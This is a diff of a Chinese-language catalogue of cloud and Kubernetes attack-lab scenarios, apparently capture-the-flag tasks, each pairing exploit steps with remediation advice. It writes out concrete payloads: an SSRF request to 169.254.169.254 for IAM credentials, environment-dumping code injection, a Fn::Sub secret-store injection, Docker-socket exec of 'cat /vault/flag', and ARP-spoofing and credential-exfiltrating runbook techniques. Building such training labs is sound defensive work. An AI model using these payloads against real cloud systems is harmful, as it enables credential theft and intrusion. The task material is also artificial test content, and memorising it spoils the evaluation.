-- 形态：`flag{cloud-29-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
-- 验收：`python3 scripts/validate-cloud-gate.py cloud-29 <flag>`（gate）+
-  `python3 tests/cloud/run.py cloud-29 <flag>`（参考利用）。
-
-**知识维度**
-
-| 规划维度 | 所需知识 |
-|---|---|
-| 环境与访问 | Managed data workflows, shared executor, and filesystem paths |
-| 侦察与前置条件 | Workspace root construction and dataset_ref normalization behavior |
-| 核心漏洞与利用 | Use ../ traversal in a dataset reference |
-| 权限、横向或影响 | Cross-tenant workspace file disclosure |
-| 验证 | Read the victim workspace secret/flag |
-
-**修复建议**
-
-路径必须先规范化再校验是否仍位于本租户工作区根目录内；执行器
-按租户隔离（沙箱/容器）。
-
-[↑ 返回索引](#五cloud公有云场景)
-
----
-
-<a id="cloud-30"></a>
-
-### CLOUD-30 · 无服务器默认服务账号提权
-
-| 字段 | 值 |
-|---|---|
-| ID | CLOUD-30 |
-| 名称 | Serverless Default Service Account: Platform Identity Escalation |
-| 交付方式 | docker |
-| 难度 | L2 |
-| 技术/CVE | N/A (over-scoped default SA, case #266/#272) |
-| 入口 | `localhost:10641` |
-| 目录 | `scenarios/cloud/serverless-sa` |
-
-**场景概述**
-
-无服务器平台用"默认计算服务账号"运行函数，该账号权限过宽（可读
-其他项目的资源）。攻击者部署恶意函数，函数运行时继承平台默认身份，
-直接调用受害者项目 API 读取其 Secret。
-
-**教材锚点**
-
-- 案例：ImageRunner（#266）；GCP Cloud Functions 提权（#272）
-- 平面：控制面（平台身份）→ 失败边界：身份
-- 六镜头：IDENTITY（默认 SA 过宽且平台自动注入）；MAGIC（函数执行
-  即自动化以服务身份运行）
-
-**前置知识 / 条件**
-
-- 无服务器运行时身份（默认服务账号）与最小权限
-
-**利用步骤**
-
-1. 部署恶意函数，代码读取运行环境中的 `DEFAULT_SA_TOKEN`。
-2. 函数输出默认服务账号令牌。
-3. 用该令牌调用受害者项目 `/api/projects/victim/secrets`，
-   读到 Secret 与 flag。
-4. 终端服务 victim-project 向 flag-vault 出示平台默认服务账号令牌，换成 flag 后回给调用方——明文只在这一步出现。
-
-**Flag**
-
-- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
-- 交付条件：只有 victim-project 向 flag-vault 出示「平台默认服务账号令牌」（校验模式 `header-secret`）时才交付；
-  其它容器、容器环境变量、落地文件与日志里都没有明文。
-- 形态：`flag{cloud-30-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
-- 验收：`python3 scripts/validate-cloud-gate.py cloud-30 <flag>`（gate）+
-  `python3 tests/cloud/run.py cloud-30 <flag>`（参考利用）。
-
-**知识维度**
-
-| 规划维度 | 所需知识 |
-|---|---|
-| 环境与访问 | Serverless functions, default ServiceAccounts, and project IAM |
-| 侦察与前置条件 | Default service account scopes and invoker/deployer permissions |
-| 核心漏洞与利用 | Invoke or deploy through an over-scoped default identity |
-| 权限、横向或影响 | Platform identity privilege escalation |
-| 验证 | Use the service account authority to retrieve the flag |
-
-**修复建议**
-
-默认服务账号必须最小权限并按函数隔离；禁止平台自动注入过宽身份；
-项目间访问默认拒绝。
-
-[↑ 返回索引](#五cloud公有云场景)
-
----
-
-<a id="cloud-31"></a>
-
-### CLOUD-31 · 持久化即服务：托管自动化后门
-
-| 字段 | 值 |
-|---|---|
-| ID | CLOUD-31 |
-| 名称 | Persistence-as-a-Service: Managed Automation Backdoor |
-| 交付方式 | docker |
-| 难度 | L3 |
-| 技术/CVE | N/A (automation-runbook persistence, case #149) |
-| 入口 | `localhost:10642` |
-| 目录 | `scenarios/cloud/persistence-as-a-service` |
-
-**场景概述**
-
-攻击者在托管自动化服务注册一个恶意 runbook，脚本以服务身份周期性
-从凭据库拉取当前凭据并访问受保护资源。防御方轮换凭据后，runbook
-自动重新获取新凭据——持久化访问不依赖任何静态后门（Persistence-
-as-a-service）。
-
-**教材锚点**
-
-- 案例：Cloud attacker persistence techniques in AWS（#149）
-- 平面：控制面（自动化服务）→ 失败边界：检测/持久化
-- 六镜头：MAGIC（托管自动化以服务身份周期运行）；DETECTION（runbook
-  混在正常自动化中难以发现）
-
-**前置知识 / 条件**
-
-- 托管自动化（runbook/定时任务）与托管身份
-- 凭据轮换作为检测/清除手段的局限
-
-**利用步骤**
-
-1. 注册恶意 runbook：脚本内容=拉取当前 vault 凭据 → 调用受保护资源
-   → 把凭据与 flag 外发到攻击者收集端点。
-2. 触发凭据轮换（`POST /rotate`）并同步受保护资源的新密钥。
-3. 等待 runbook 下一轮执行（每 5s）——它自动用新凭据再次读到 flag。
-4. 终端服务 victim-resource 向 flag-vault 出示受保护资源内网地址（密钥轮换校验通过），换成 flag 后回给调用方——明文只在这一步出现。
-
-**Flag**
-
-- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
-- 交付条件：只有 victim-resource 向 flag-vault 出示「受保护资源内网地址（密钥轮换校验通过）」（校验模式 `network-source`）时才交付；
-  其它容器、容器环境变量、落地文件与日志里都没有明文。
-- 形态：`flag{cloud-31-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
-- 验收：`python3 scripts/validate-cloud-gate.py cloud-31 <flag>`（gate）+
-  `python3 tests/cloud/run.py cloud-31 <flag>`（参考利用）。
-
-**知识维度**
-
-| 规划维度 | 所需知识 |
-|---|---|
-| 环境与访问 | Managed automation, runbooks, credentials, and rotation |
-| 侦察与前置条件 | Runbook persistence behavior and credential-vault access after rotation |
-| 核心漏洞与利用 | Create a persistent automation runbook/backdoor |
-| 权限、横向或影响 | Long-lived access across credential rotation |
-| 验证 | Wait for or invoke the runbook and capture the final flag |
-
-**修复建议**
-
-自动化服务要审计 runbook 的来源与内容；托管身份按用途最小化；
-轮换之外还要监控异常的周期外发行为；runbook 代码应受代码审查
-与签名保护。
-
-[↑ 返回索引](#五cloud公有云场景)
-
----
-
 <a id="六k8s私有云场景"></a>
 
-## 六、K8s（私有云 / Kubernetes）场景（31）
+## 六、K8s（私有云 / Kubernetes）场景（60）
 
 | ID | 名称 | 类型 | 难度 | 技术/CVE | 入口 |
 |---|---|---|---|---|---|
 | [K8S-01](#k8s-01) | runC WORKDIR Container Escape | k8s | L3 | CVE-2024-21626 | KIND 集群内 |
 | [K8S-02](#k8s-02) | K8s Cross-Pod Log Symlink Escape | k8s | L3 | N/A (跨 Pod 日志符号链接；原生 runC 竞态在本机不可复现) | KIND 集群内 |
 | [K8S-03](#k8s-03) | Kubelet Client Cert → Node Secret Read | k8s | L3 | N/A (kubelet 客户端证书越权；原生共享挂载竞态在本机不可复现) | KIND 集群内 |
+| [K8S-04](#k8s-04) | SSRF to Instance Metadata Credential Theft | docker | L3 | N/A (SSRF → IMDS) | `localhost:10601` |
 | [K8S-05](#k8s-05) | Node Artifact Consumer → Weak-Label Service Takeover | k8s | L3 | N/A (节点侧特权 agent 消费集群内可控内容；gitRepo 卷在 KIND 上不可复现) | KIND 集群内 |
 | [K8S-06](#k8s-06) | K8s RBAC Secrets Abuse | k8s | L2 | N/A (misconfiguration) | KIND 集群内 |
 | [K8S-07](#k8s-07) | Kubelet API Anonymous Access | k8s | L2 | N/A (misconfiguration) | KIND 集群内 |
@@ -2375,8 +294,36 @@ as-a-service）。
 | [K8S-28](#k8s-28) | Node Selector Evasion | k8s | L2 | N/A (scheduling bypass) | KIND 集群内 |
 | [K8S-29](#k8s-29) | Toleration Abuse (Taint Bypass) | k8s | L2 | N/A (taint bypass) | KIND 集群内 |
 | [K8S-30](#k8s-30) | CNI IP Spoofing (NetworkPolicy Bypass) | k8s | L3 | N/A (IP spoofing) | KIND 集群内 |
+| [K8S-31](#k8s-31) | CAP_NET_RAW → Private-Cloud Metadata MITM | k8s | L3 | N/A (CAP_NET_RAW + ARP spoofing) | KIND 集群内 |
 | [K8S-32](#k8s-32) | K8s SA Token → Cross-Namespace Access | k8s | L2 | N/A (overly permissive RBAC) | KIND 集群内 |
 | [K8S-33](#k8s-33) | Multi-Tenant K8s: Container Escape → Cross-Tenant Access | k8s | L2 | N/A (privileged container + hostPID escape) | KIND 集群内 |
+| [K8S-34](#k8s-34) | Serverless Code Injection → IAM PassRole | docker | L2 | N/A (command injection + IAM privesc) | `localhost:10604` |
+| [K8S-35](#k8s-35) | Private IaC Template Injection → Internal Secret Store | docker | L2 | N/A (CloudFormation-compatible Fn::Sub injection) | `localhost:10605` |
+| [K8S-36](#k8s-36) | Private CI/CD Pipeline Poisoning → Secret Exfiltration | docker | L2 | N/A (CI/CD script injection) | `localhost:10608` |
+| [K8S-37](#k8s-37) | Managed Notebook Escape → Cluster ServiceAccount Token Theft | docker | L3 | N/A (notebook escape + SA token) | `localhost:10609` |
+| [K8S-38](#k8s-38) | OIDC Claim Mismatch → Cross-Project AssumeRole | docker | L3 | N/A (OIDC federation misconfiguration) | `localhost:10611` |
+| [K8S-39](#k8s-39) | IAM Trust Policy Principal:* → Cross-Project Takeover | docker | L2 | N/A (overly permissive trust policy) | `localhost:10612` |
+| [K8S-40](#k8s-40) | Golden SAML → Internal Federation Trust Root Compromise | docker | L3 | N/A (SAML signing key exposure) | `localhost:10613` |
+| [K8S-41](#k8s-41) | Tenant Policy Bypass via Legacy API Version | docker | L3 | N/A (SCP-equivalent policy enforcement gap) | `localhost:10615` |
+| [K8S-42](#k8s-42) | Managed Notebook Front-End → Cross-Tenant RCE | docker | L2 | N/A (forwardingId authz bypass, case #073) | `localhost:10623` |
+| [K8S-43](#k8s-43) | Managed PostgreSQL FDW Host File Read → Platform Credentials | docker | L3 | N/A (log_fdw path traversal, case #015) | `localhost:10624` |
+| [K8S-44](#k8s-44) | Managed PostgreSQL Engine Patch: Index Function Runs as Platform Role → Host RCE | docker | L3 | N/A (ATExecChangeOwner patch + ANALYZE, case #052) | `localhost:10625` |
+| [K8S-45](#k8s-45) | Shared Integration Runtime → Cross-Tenant Credentials | docker | L3 | N/A (ODBC driver injection, CVE-2022-29972 lineage, case #062) | `localhost:10626` |
+| [K8S-46](#k8s-46) | Managed DB Internal Subnet + CN Validation Bypass | docker | L3 | N/A (internal subnet + mis-anchored cert regex, case #061) | `localhost:10627` |
+| [K8S-47](#k8s-47) | K8s Host-Agent Channel → Node Bootstrap Secrets | docker | L3 | N/A (unvalidated transport cert, case #255/#184) | `localhost:10628` |
+| [K8S-48](#k8s-48) | Internal Build Fleet + Private Registry Supply-Chain Overwrite | docker | L2 | N/A (unauth internal registry, case #260 lineage) | `localhost:10629` |
+| [K8S-49](#k8s-49) | Malicious Model Loading → Inference Pod → Node Metadata | docker | L2 | N/A (pickle deserialization, case #091) | `localhost:10630` |
+| [K8S-50](#k8s-50) | Predictable Volume ID + Missing Ownership Check | docker | L2 | N/A (control-plane ownership check missing) | `localhost:10631` |
+| [K8S-51](#k8s-51) | Directory Actor Token: Cross-Tenant Identity Confusion | docker | L2 | N/A (actor/tenant validation bug, case #246) | `localhost:10632` |
+| [K8S-52](#k8s-52) | Platform Middleware Unauth Management Channel → VM Root | docker | L2 | N/A (auth bypass in platform agent, CVE-2021-38647 lineage) | `localhost:10633` |
+| [K8S-53](#k8s-53) | IAM Enumeration 2.0: Unlogged AccessDenied Oracle | docker | L3 | N/A (uncovered service error oracle, case #134/#137) | `localhost:10634` |
+| [K8S-54](#k8s-54) | Private Service Catalog Beta Endpoint: Invisible Write | docker | L3 | N/A (non-production endpoint skips audit, case #154) | `localhost:10635` |
+| [K8S-55](#k8s-55) | Resource Explorer: Feature-Inherent Quiet Enumeration | docker | L3 | N/A (unlogged search API, case #148) | `localhost:10636` |
+| [K8S-56](#k8s-56) | Low-Code Connector Secrets via Private Control Plane | docker | L2 | N/A (connector store tenant-scope missing, case #249/#197) | `localhost:10638` |
+| [K8S-57](#k8s-57) | Shared NAT Egress: Source-IP Allowlist Bypass | docker | L3 | N/A (service-tag source-IP trust, case #259) | `localhost:10639` |
+| [K8S-58](#k8s-58) | Managed Data Workflow → Cross-Tenant Path Traversal | docker | L2 | N/A (cross-tenant path traversal, case #267) | `localhost:10640` |
+| [K8S-59](#k8s-59) | Serverless Default Service Account: Platform Identity Escalation | docker | L2 | N/A (over-scoped default SA, case #266/#272) | `localhost:10641` |
+| [K8S-60](#k8s-60) | Persistence-as-a-Service: Managed Automation Backdoor | docker | L3 | N/A (automation-runbook persistence, case #149) | `localhost:10642` |
 
 <a id="k8s-01"></a>
 
@@ -2674,6 +621,73 @@ bash tests/k8s/run.sh k8s-03 <agent-kubeconfig> <expected-flag> <cluster-name>
 **修复建议**
 
 升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
+
+[↑ 返回索引](#六k8s私有云场景)
+
+---
+
+<a id="k8s-04"></a>
+
+### K8S-04 · SSRF → 私有云实例元数据凭据窃取
+
+| 字段 | 值 |
+|---|---|
+| ID | K8S-04 |
+| 名称 | SSRF to Instance Metadata Credential Theft |
+| 交付方式 | docker |
+| 难度 | L3 |
+| 技术/CVE | N/A (SSRF → IMDS) |
+| 入口 | `localhost:10601` |
+| 目录 | `scenarios/k8s/ssrf-to-imds` |
+
+**场景概述**
+
+Web 应用存在 SSRF，可访问私有云 IaaS 实例的 `169.254.169.254` 元数据服务。
+该服务会向实例下发平台角色临时凭据；攻击者借用这些凭据访问私有对象存储，
+从而越过工作负载身份边界。
+
+**教材锚点**
+
+- 案例：IMDS 与 SSRF（Ch4 Technique 1，如 #019/#036 系列）
+- 平面：数据面（web）→ 控制面凭据；失败边界：网络/身份
+- 六镜头：MAGIC（IMDS 自动为实例注入角色凭据）；DETECTION（IMDS
+  访问通常不产生租户审计）
+
+**前置知识 / 条件**
+
+- SSRF 原理；IMDS 169.254.169.254 与实例角色；临时凭据使用
+
+**利用步骤**
+
+1. 在 `/fetch?url=` 输入 `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
+   获取角色名。
+2. 继续读取角色路径，获得 AccessKeyId / SecretAccessKey / Token。
+3. 用凭据访问私有对象存储模拟服务（`/latest/meta-data/...` 之外的 `s3` 容器，
+   即 S3-compatible object storage），读取 flag。
+4. 终端服务 s3 向 flag-vault 出示从 IMDS 偷到的 AK/SK 按 SigV4 签名，换成 flag 后回给调用方——明文只在这一步出现。
+
+**Flag**
+
+- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
+- 交付条件：只有 s3 向 flag-vault 出示「从 IMDS 偷到的 AK/SK 按 SigV4 签名」（校验模式 `sigv4`）时才交付；
+  其它容器、容器环境变量、落地文件与日志里都没有明文。
+- 形态：`flag{k8s-04-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
+- 验收：`python3 scripts/validate-cloud-gate.py k8s-04 <flag>`（gate）+
+  `python3 tests/cloud/run.py k8s-04 <flag>`（参考利用）。
+
+**知识维度**
+
+| 规划维度 | 所需知识 |
+|---|---|
+| 环境与访问 | Docker Compose web service, instance metadata, and private object storage |
+| 侦察与前置条件 | SSRF URL behavior and IMDS role/credential paths |
+| 核心漏洞与利用 | Use SSRF to query 169.254.169.254 and obtain temporary credentials |
+| 权限、横向或影响 | Instance-role credential theft and private object-storage access |
+| 验证 | Use the credentials to read the object-storage flag |
+
+**修复建议**
+
+SSRF 出口白名单；IMDSv2 + 令牌（TOFU）；网络层阻止应用访问链路本地地址。
 
 [↑ 返回索引](#六k8s私有云场景)
 
@@ -5416,6 +3430,85 @@ bash tests/k8s/run.sh k8s-30 <agent-kubeconfig> <expected-flag> <cluster-name>
 
 ---
 
+<a id="k8s-31"></a>
+
+### K8S-31 · CAP_NET_RAW → 私有云元数据服务 MITM
+
+| 字段 | 值 |
+|---|---|
+| ID | K8S-31 |
+| 名称 | CAP_NET_RAW → Private-Cloud Metadata MITM |
+| 交付方式 | k8s |
+| 难度 | L3 |
+| 技术/CVE | N/A (CAP_NET_RAW + ARP spoofing) |
+| 入口 | KIND 集群内入口（无固定宿主端口） |
+| 目录 | `scenarios/k8s/cap-netraw-metadata` |
+
+**场景概述**
+
+自建多租户集群中的攻击者 pod 被授予 CAP_NET_RAW，与 victim pod 位于同节点。
+攻击者通过 ARP 欺骗劫持 victim 到私有云元数据服务的流量，读取或替换实例凭据响应，
+随后取得该工作负载在内部云平面的身份。
+
+**前置知识 / 条件**
+
+- ARP 欺骗；IMDS 元数据协议；容器 capabilities
+
+#### Knowledge
+- Linux capabilities (CAP_NET_RAW) and network stack manipulation
+- ARP spoofing and man-in-the-middle attack techniques
+- EC2 Instance Metadata Service (IMDS) protocol
+
+#### Tools
+- arpspoof / ettercap: ARP spoofing tools
+- tcpdump / wireshark: Network traffic capture and analysis
+
+**利用步骤**
+
+1. 与 victim 同节点、带 CAP_NET_RAW 的攻击者 pod 起一个原始套接字，向 victim 广播 ARP 应答，
+   宣称元数据服务的地址在本机 MAC 上（同时向元数据服务侧宣称 victim 在本机 MAC 上，做双向劫持）。
+2. 打开发包所在 netns 的转发，让被劫持的流量继续能被真实 IMDS 处理；同时用 AF_PACKET 抓包，
+   从帧里取出 IMDS 响应正文（含实例凭据与 flag）。
+3. flag 只存在于集群内 Secret `imds-flag`（挂进 metadata-server 的 `/flag`），
+   因此明文只会出现在这条被劫持的响应里。
+
+> 当前 KIND 环境（kindnet / Calico 均为点对点 veth）不提供共享二层，第 1 步的 ARP 欺骗
+> 在对端不生效，参考利用尚未跑通；详见 `AiReport`/`AiRecord/changes/20261010-4.md` 的环境说明。
+
+**验证命令**
+
+```bash
+kubectl exec attacker -- cat /proc/1/status | grep Cap
+kubectl exec victim -- cat /tmp/metadata-credentials.json
+```
+
+**Flag**
+
+- 位置：集群内 Secret `imds-flag`（default），挂载进 `metadata-server` 的 `/flag/flag`；
+  IMDS 的凭据响应里带出 flag。
+- 形态：`flag{k8s-31-<16 位十六进制>}`。
+- 验收：`bash scripts/validate-k8s-gate.sh k8s-31 <agent-kubeconfig> <flag> <cluster>`（gate）+
+  `bash tests/k8s/run.sh k8s-31 <agent-kubeconfig> <flag> <cluster>`（参考利用，当前受限）。
+
+**知识维度**
+
+| 规划维度 | 所需知识 |
+|---|---|
+| 环境与访问 | KIND, CAP_NET_RAW, ARP, and metadata service networking |
+| 侦察与前置条件 | Victim/metadata traffic path and L2 neighbor discovery |
+| 核心漏洞与利用 | Perform ARP spoofing to MITM IMDS traffic |
+| 权限、横向或影响 | Instance credential interception across a shared node network |
+| 验证 | Capture the intercepted credential/flag response |
+
+**修复建议**
+
+默认移除 NET_RAW；元数据服务采用 IMDSv2 令牌 + 网络策略限制；
+二层隔离（每个节点独立 L2）。
+
+[↑ 返回索引](#六k8s私有云场景)
+
+---
+
 <a id="k8s-32"></a>
 
 ### K8S-32 · K8s SA Token → 跨命名空间访问
@@ -5621,6 +3714,1870 @@ kubectl exec -n tenant-a attacker -- cat /proc/1/status | grep -E 'Seccomp|Cap'
 
 ---
 
+<a id="k8s-34"></a>
+
+### K8S-34 · 无服务器代码注入 → IAM PassRole
+
+| 字段 | 值 |
+|---|---|
+| ID | K8S-34 |
+| 名称 | Serverless Code Injection → IAM PassRole |
+| 交付方式 | docker |
+| 难度 | L2 |
+| 技术/CVE | N/A (command injection + IAM privesc) |
+| 入口 | `localhost:10604` |
+| 目录 | `scenarios/k8s/lambda-passrole` |
+
+**场景概述**
+
+私有云无服务器入口把用户提交的代码转发到函数运行时执行，形成命令注入。
+函数运行时携带平台临时身份；攻击者利用该身份调用内部 IAM 兼容服务 AssumeRole，
+完成从数据面到控制面的权限提升。
+
+**教材锚点**
+
+- 案例：Serverless 执行面（Ch9）；IAM PassRole 提权路径
+- 平面：数据面（函数执行）→ 控制面（IAM）；失败边界：身份
+- 六镜头：MAGIC（托管函数执行即自动化以服务身份运行）；
+  IDENTITY（函数环境注入角色凭据）
+
+**前置知识 / 条件**
+
+- Serverless 执行模型；环境变量中的临时凭据；IAM AssumeRole
+
+**利用步骤**
+
+1. POST `/invoke`，`{"code": "import os; print(os.environ)"}` 读取
+   serverless runtime 环境（或直接 `cat` 环境文件），拿到 IAM AK/SK。
+2. 用凭据调用 IAM 服务（`_infra/iam-trust`）AssumeRole，换取目标角色。
+3. 用角色凭据读取受保护资源得到 flag。
+4. 终端服务 lambda 向 flag-vault 出示serverless runtime 执行角色的 AK/SK 签名，换成 flag 后回给调用方——明文只在这一步出现。
+
+**Flag**
+
+- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
+- 交付条件：只有 lambda 向 flag-vault 出示「serverless runtime 执行角色的 AK/SK 签名」（校验模式 `sigv4`）时才交付；
+  其它容器、容器环境变量、落地文件与日志里都没有明文。
+- 形态：`flag{k8s-34-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
+- 验收：`python3 scripts/validate-cloud-gate.py k8s-34 <flag>`（gate）+
+  `python3 tests/cloud/run.py k8s-34 <flag>`（参考利用）。
+
+**知识维度**
+
+| 规划维度 | 所需知识 |
+|---|---|
+| 环境与访问 | Serverless gateway, serverless runtime execution, and IAM |
+| 侦察与前置条件 | Command-injection input and serverless runtime role permissions |
+| 核心漏洞与利用 | Inject code/commands and request a function with PassRole |
+| 权限、横向或影响 | IAM privilege escalation through a delegated execution role |
+| 验证 | Invoke the created function or role path to obtain the flag |
+
+**修复建议**
+
+函数入口禁止任意代码执行；执行角色最小权限；运行时不注入可读凭据。
+
+[↑ 返回索引](#六k8s私有云场景)
+
+---
+
+<a id="k8s-35"></a>
+
+### K8S-35 · 私有云 IaC 模板注入 → 内部密钥库泄露
+
+| 字段 | 值 |
+|---|---|
+| ID | K8S-35 |
+| 名称 | Private IaC Template Injection → Internal Secret Store |
+| 交付方式 | docker |
+| 难度 | L2 |
+| 技术/CVE | N/A (CloudFormation-compatible Fn::Sub injection) |
+| 入口 | `localhost:10605` |
+| 目录 | `scenarios/k8s/cf-injection` |
+
+**场景概述**
+
+私有云 IaC 平台接受 CloudFormation-compatible 的 YAML 模板，并对 `Fn::Sub` 进行服务端求值。
+解析过程使用高权限栈执行角色，攻击者可注入参数表达式，从内部密钥参数库读取敏感值。
+
+**教材锚点**
+
+- 案例：CloudFormation 模板注入（#005/#020）
+- 平面：控制面（IaC）→ 失败边界：身份/自动化
+- 六镜头：MAGIC（IaC 解析自动化以服务身份运行，是攻击目标）；
+  DETECTION（模板解析过程不产生直观审计）
+
+**前置知识 / 条件**
+
+- 兼容模板引擎的内建函数（Fn::Sub / Ref / Fn::ImportValue）
+- IaC 服务端解析的注入面
+
+**利用步骤**
+
+1. 读取模板解析器根入口（localhost:10605）——除公布 `POST /parse` 外，
+   它还暴露了 `Fn::Sub` 可解析的参数命名空间（形如
+   `/secure/<name>`，例如 `/secure/app/db-password`）。
+2. 向该入口提交原始 YAML 模板，其中 `BucketName` 使用
+   `!Sub ${/secure/flag}` 简写（等价于 `Fn::Sub` 字典）。
+3. 解析器按兼容模板引擎的内建函数求值，
+   将 `${/secure/flag}` 替换为内部密钥库参数值。
+4. 观察解析器输出——泄露的内部密钥库参数即为 flag。
+
+> 注意：模板必须以 YAML 原文提交；若套上 JSON 包装，`Fn::Sub` 会退化成
+> 普通字符串而不被求值。
+5. 终端服务 ssm 向 flag-vault 出示栈执行角色令牌，换成 flag 后回给调用方——明文只在这一步出现。
+
+**Flag**
+
+- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
+- 交付条件：只有 ssm 向 flag-vault 出示「栈执行角色令牌」（校验模式 `header-secret`）时才交付；
+  其它容器、容器环境变量、落地文件与日志里都没有明文。
+- 形态：`flag{k8s-35-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
+- 验收：`python3 scripts/validate-cloud-gate.py k8s-35 <flag>`（gate）+
+  `python3 tests/cloud/run.py k8s-35 <flag>`（参考利用）。
+
+**知识维度**
+
+| 规划维度 | 所需知识 |
+|---|---|
+| 环境与访问 | CloudFormation-compatible templates, Fn::Sub, and an internal secret store |
+| 侦察与前置条件 | Template interpolation context and accessible parameter names |
+| 核心漏洞与利用 | Inject a Fn::Sub expression to resolve protected internal secret-store data |
+| 权限、横向或影响 | Control-plane secret disclosure |
+| 验证 | Read the leaked parameter/flag |
+
+**修复建议**
+
+模板表达式求值必须隔离；服务端解析不得接触高权限机密；对模板做
+严格语法校验。
+
+[↑ 返回索引](#六k8s私有云场景)
+
+---
+
+<a id="k8s-36"></a>
+
+### K8S-36 · 私有云 CI/CD 管道投毒 → 凭据外泄
+
+| 字段 | 值 |
+|---|---|
+| ID | K8S-36 |
+| 名称 | Private CI/CD Pipeline Poisoning → Secret Exfiltration |
+| 交付方式 | docker |
+| 难度 | L2 |
+| 技术/CVE | N/A (CI/CD script injection) |
+| 入口 | `localhost:10608` |
+| 目录 | `scenarios/k8s/ci-poisoning` |
+
+**场景概述**
+
+企业私有云 CI 运行器允许多个项目提交工作流和构建内容，管道脚本存在 shell 注入。
+攻击者投毒构建流程后读取流水线 Secret 与短期工作负载身份，并访问受保护构建产物。
+
+**教材锚点**
+
+- 案例：托管 CI/CD 攻击面（Ch9）；CI 脚本注入
+- 平面：控制面（CI）→ 失败边界：身份/供应链
+- 六镜头：MAGIC（CI runner 以仓库身份自动执行）；SHARED（runner
+  是共享构建舰队）
+
+**前置知识 / 条件**
+
+- CI 工作流语法与脚本注入；CI Secret 环境
+
+**利用步骤**
+
+1. 向 git-server 提交恶意 workflow/脚本，触发 ci-runner 执行。
+2. 在注入的 shell 命令中读取 CI 环境变量/Secret 以及短期工作负载身份材料。
+3. 携带 `X-Workload-Token` 请求受保护的云 artifact API，读取跨租户构建产物与 flag。
+4. 终端服务 ci-runner 向 flag-vault 出示流水线工作负载令牌，换成 flag 后回给调用方——明文只在这一步出现。
+
+**Flag**
+
+- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
+- 交付条件：只有 ci-runner 向 flag-vault 出示「流水线工作负载令牌」（校验模式 `header-secret`）时才交付；
+  其它容器、容器环境变量、落地文件与日志里都没有明文。
+- 形态：`flag{k8s-36-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
+- 验收：`python3 scripts/validate-cloud-gate.py k8s-36 <flag>`（gate）+
+  `python3 tests/cloud/run.py k8s-36 <flag>`（参考利用）。
+
+**知识维度**
+
+| 规划维度 | 所需知识 |
+|---|---|
+| 环境与访问 | Git/CI pipeline services and build execution |
+| 侦察与前置条件 | Pipeline trigger, repository input, and runner environment discovery |
+| 核心漏洞与利用 | Poison CI configuration or build commands |
+| 权限、横向或影响 | CI runner secret exposure |
+| 验证 | Read the runner-provided flag/secret |
+
+**修复建议**
+
+管道脚本参数化并禁止 shell 拼接；Secret 按最小权限注入；
+PR 触发任务不得携带写权限。
+
+[↑ 返回索引](#六k8s私有云场景)
+
+---
+
+<a id="k8s-37"></a>
+
+### K8S-37 · 托管笔记本逃逸 → 集群服务账号令牌窃取
+
+| 字段 | 值 |
+|---|---|
+| ID | K8S-37 |
+| 名称 | Managed Notebook Escape → Cluster ServiceAccount Token Theft |
+| 交付方式 | docker |
+| 难度 | L3 |
+| 技术/CVE | N/A (notebook escape + SA token) |
+| 入口 | `localhost:10609` |
+| 目录 | `scenarios/k8s/notebook-escape` |
+
+**场景概述**
+
+私有云 MLOps 平台允许租户在托管 notebook 中执行任意代码，但执行沙箱暴露了 Docker socket。
+攻击者从 notebook 逃逸到宿主或集群侧，取得集群服务账号身份并读取受保护资源。
+
+**教材锚点**
+
+- 案例：托管 notebook 攻击面（Ch10 Technique 2）；SageMaker/AI Hub（#011/#035）
+- 平面：数据面（notebook）→ 集群；失败边界：命名空间/宿主
+- 六镜头：MAGIC（notebook 执行即产品功能）；IDENTITY（SA token
+  随容器自动挂载）
+
+**前置知识 / 条件**
+
+- Notebook 代码执行；Docker socket 逃逸；SA token 与 K8s API
+
+**利用步骤**
+
+1. 在 notebook 里执行代码，探测挂载进来的 `/var/run/docker.sock`。
+2. 用这个 socket 与宿主机的 docker daemon 对话（`GET /containers/json`），列出租户之外的容器。
+3. 找到 `flag-vault` 容器，经 `POST /containers/<id>/exec` + `POST /exec/<id>/start` 以 root 执行
+   `cat /vault/flag`。
+4. 密文只存在于该容器内的 0600 root 文件里，宿主机与其它容器都拿不到——读到它即证明已完成
+   容器逃逸。
+
+**Flag**
+
+`flag{k8s-37-step2-...}`（集群 Secret）
+
+**知识维度**
+
+| 规划维度 | 所需知识 |
+|---|---|
+| 环境与访问 | Managed notebook, shell execution, and Kubernetes ServiceAccounts |
+| 侦察与前置条件 | Notebook execution context and mounted token location |
+| 核心漏洞与利用 | Escape the notebook execution boundary |
+| 权限、横向或影响 | Kubernetes ServiceAccount credential theft |
+| 验证 | Read the token/flag from the notebook container |
+
+**修复建议**
+
+notebook 沙箱禁用 Docker socket；SA 最小权限；执行环境与集群隔离。
+
+[↑ 返回索引](#六k8s私有云场景)
+
+---
+
+<a id="k8s-38"></a>
+
+### K8S-38 · OIDC Claim 错配 → 跨项目 AssumeRole
+
+| 字段 | 值 |
+|---|---|
+| ID | K8S-38 |
+| 名称 | OIDC Claim Mismatch → Cross-Project AssumeRole |
+| 交付方式 | docker |
+| 难度 | L3 |
+| 技术/CVE | N/A (OIDC federation misconfiguration) |
+| 入口 | `localhost:10611` |
+| 目录 | `scenarios/k8s/oidc-federation` |
+
+**场景概述**
+
+私有云 IAM 的 OIDC 联合信任策略未完整校验仓库、环境或 ref 等 claim。
+攻击者借用其他项目合法签发的 OIDC token 通过信任策略，以 AssumeRoleWithWebIdentity
+取得目标项目角色。
+
+**教材锚点**
+
+- 案例：OIDC 缺条件信任（Ch3 T1，GitHub OIDC any-repo 假设）
+- 平面：控制面（身份联合）→ 失败边界：身份
